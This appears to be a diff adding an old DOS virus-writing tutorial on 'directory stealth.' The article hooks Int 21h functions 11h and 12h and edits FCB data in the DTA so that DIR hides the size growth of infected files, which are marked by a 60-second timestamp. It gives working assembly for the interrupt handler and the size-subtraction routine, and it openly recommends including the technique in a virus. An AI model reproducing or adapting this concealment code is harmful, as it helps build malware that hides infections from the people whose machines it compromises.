@@ -1,0 +1,129 @@
+Directory Stealth (FCB)
+-----------------------------------------------------------------------------
+
+Nowadays, a virus needs to use some kind of stealth technique in order to be
+effective.  Memory stealth is something obviously needed in a virus, but in
+this article we'll discuss another stealth method, simple and easy to put
+into practice.
+
+It's a problem, these days.  Users are informed about viruses and everyone is
+astonished, imagining all these little bugs are getting into their machines. 
+When a user sees his files start to grow for no apparent reason, he knows
+something strange is happening.  And that strange 'thing' is almost certainly
+a virus.
+
+The technique we'll discuss in this article was developed precisely to avoid
+just this situation: Directory Stealth.  We use this technique so that when
+the user views his directory, he can't see the increase in file size which
+results from a virus infection.
+
+When the user types DIR, DOS functions 11h and 12h are called.  What we'll do
+is to intercept these calls from our Int 21 handler.
+
+Before going on, we need to talk about FCB (File control Block). This is a
+table which DOS uses to work with files: open, close, etc. etc.  There are 2
+types of FCBs.  One is NORMAL...  Its format is as follows:
+
+offset   Size      Description
+-----------------------------------------------------------------------------
+00h       1        Drive (00=actual, 01=A:, 02=B:, 03=C: etc.)
+01h       8        File name.  Space filled if less than 8 characters.
+09h       3        File extension.
+0Ch       2        Actual Block.  Points to the register block.
+0Eh       2        Register size.
+10h       4        File size in bytes.
+14h       2        Date.
+16h       2        Time.
+18h       4        Reserved (MS doesn't tell us what it's used for)  ;)
+1Ch       4        Equal to offset 10h, but that's the default value.
+20h       1        Offset from actual register.
+21h       4        Relative register.
+
+There's also an EXTENDED FCB which is the same as the NORMAL FCB, except that
+there are 7 additional bytes added to the beginning (before offset 0h of the
+NORMAL FCB)
+
+Offset  Size       Description
+-----------------------------------------------------------------------------
+-07h     1         contains the value 0FFh, which indicates its an extended 
+                   FCB.
+-06h     5         Reserved
+-01h     1         Byte Attribute
+
+When we ask for the DIR, Int 21 functions 11h & 12h are executed and the
+system searches for the files based on the contents of the FCB.  If the
+function ends satisfactorily, the contents of the FCB are copied to the DTA. 
+What we are going to do is to edit the data copied to the DTA.
+
+First, we add the code which will intercept the Int 21 11h and 12h functions:
+
+Handler_21:
+           ..
+           ..
+           cmp ah,11h           ; Did the user ask for a directory?
+           je D_stealth         ; invoke stealth
+           cmp ah,12h           ; Did the user ask for a directory?
+           je D_stealth         ; invoke stealth
+           ..
+           ..
+
+Let's go straight to the stealth code.  First we'll call the original Int 21
+so the DTA is filled with the file data.
+
+D_Stealth:
+          pushf                          ; we simulate an
+          call dword ptr cs:[Old21]      ; int 21h
+          or al,al                       ; if AL=0 then all OK.
+          jnz ERROR                      ; ag, there's been an error. ;)
+
+
+What we do next is to obtain the DTA address so we can modify the data.     
+
+          push ax bx es                  ; We store the registers we're using
+          mov ah,2fh                     ; The DTA address is returned in
+          int 21h                        ; ES:BX 
+
+Now we must determine whether it's an extended or normal FCB, since the
+offsets will be different.  So we see if the first byte is 0FFh: if it is,
+it's extended.  Otherwise it's normal.  :) If it's extended, we'll add 7
+bytes to its address.  These are of no use to us so we'll skip them so as to
+get to the first datum the two (extended and normal) have in common.
+
+         cmp byte ptr es:[BX],0ffh      ; Is the first byte FF?
+         jne normal                     ; no, then it's a normal FCB
+         add bx,7h                      ; If EXTENDED, add 7 bytes
+
+Next, we must see if the file is infected, since if it is, we're not
+interested in fixing anything.  For this we assume that we've marked infected
+files by setting the seconds to 60, an impossible value.
+
+normal: mov ax,es:[bx+17h]              ; We take the file's time from the
+        and ax,1fh                      ; FCB and we check the seconds.
+        xor al,1eh                      ; Do the seconds = 60?
+                                        ; 1eh = 30 decimal, 30*2 = 60 sec.
+                                        ; XOR = CMP, but quicker and better.
+        jne no_infectado                ; not 60 = not infected..
+
+The following code is executed ONLY if the file is infected.  We subtract the
+size of the virus from the file size in order to obtain the original file
+size..
+
+        sub word ptr es:[bx+1dh],VIRLEN   ; Subtract virus size.
+        sbb word ptr es:[bx+1fh],0        
+
+Done!  Now we restore the registers we used and return from the int.
+
+no_infectado: pop es bx ax              ; restore the registers
+error:        iret                      ; return..
+
+There we are.  It's really very easy and worthy of being included in a virus. 
+The code is minimal and its services are truly useful..
+
+Well, we've covered Directory Stealth, using the FCB.  But there is another
+type of stealth, using HANDLE, which is the method used by Norton Commander,
+PCTools and similar programs to look at files.  This method is much easier to
+use than FCB.  In a forthcoming article we'll cover this method, which is
+practically the same as FCB.
+
+                                                            -  WM’  -
+
